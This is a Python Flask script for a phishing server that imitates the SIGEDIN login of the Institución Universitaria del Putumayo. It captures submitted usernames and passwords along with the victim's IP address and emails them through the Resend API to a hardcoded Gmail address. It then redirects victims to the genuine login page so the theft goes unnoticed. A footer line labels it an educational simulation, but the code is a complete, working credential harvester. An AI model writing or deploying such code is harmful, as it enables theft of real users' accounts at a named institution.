from flask import Flask, request, redirect, send_from_directory
import datetime
import os
import requests

app = Flask(__name__)

RESEND_API_KEY = os.environ.get("RESEND_API_KEY")
CORREO_DESTINO = "marlonmoncayo7474@gmail.com"

def enviar_correo_resend(usuario, clave, ip, fecha):
    if not RESEND_API_KEY:
        print("[-] Error: La variable de entorno RESEND_API_KEY no está configurada.", flush=True)
        return
    try:
        url = "https://api.resend.com/emails"
        headers = {
            "Authorization": f"Bearer {RESEND_API_KEY}",
            "Content-Type": "application/json"
        }
        data = {
            "from": "onboarding@resend.dev",
            "to": [CORREO_DESTINO],
            "subject": "🚨 ¡Nuevas credenciales capturadas en SIGEDIN!",
            "html": f"""
            <div style="font-family: Arial, sans-serif; color: #1f2937; padding: 20px; border: 1px solid #e5e7eb; border-radius: 8px;">
              <h2 style="color: #d97706;">¡Credenciales capturadas con éxito!</h2>
              <p><strong>Fecha y Hora:</strong> {fecha}</p>
              <p><strong>IP de la víctima:</strong> {ip}</p>
              <hr style="border: none; border-top: 1px solid #e5e7eb;">
              <p><strong>Usuario / Documento:</strong> <span style="color: #dc2626; font-size: 16px;">{usuario}</span></p>
              <p><strong>Contraseña capturada:</strong> <span style="color: #dc2626; font-size: 16px;">{clave}</span></p>
              <hr style="border: none; border-top: 1px solid #e5e7eb;">
              <p style="font-size: 12px; color: #6b7280;">Simulación educativa de Phishing - Institución Universitaria del Putumayo</p>
            </div>
            """
        }
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 200:
            print("[+] Correo de alerta enviado exitosamente vía Resend API.", flush=True)
        else:
            print(f"[-] Error en la API de Resend: {response.text}", flush=True)
    except Exception as e:
        print(f"[-] Excepción al enviar correo: {e}", flush=True)

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

@app.route('/', methods=['POST'])
def capturar_credenciales():
    usuario = request.form.get('usuario', '')
    clave = request.form.get('clave', '')
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    print(f"\n[CAPTURA] Usuario: {usuario} | Clave: {clave} | IP: {ip}", flush=True)
    enviar_correo_resend(usuario, clave, ip, fecha)
    
    return redirect('https://sigedin.uniputumayo.edu.co/login', code=302)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)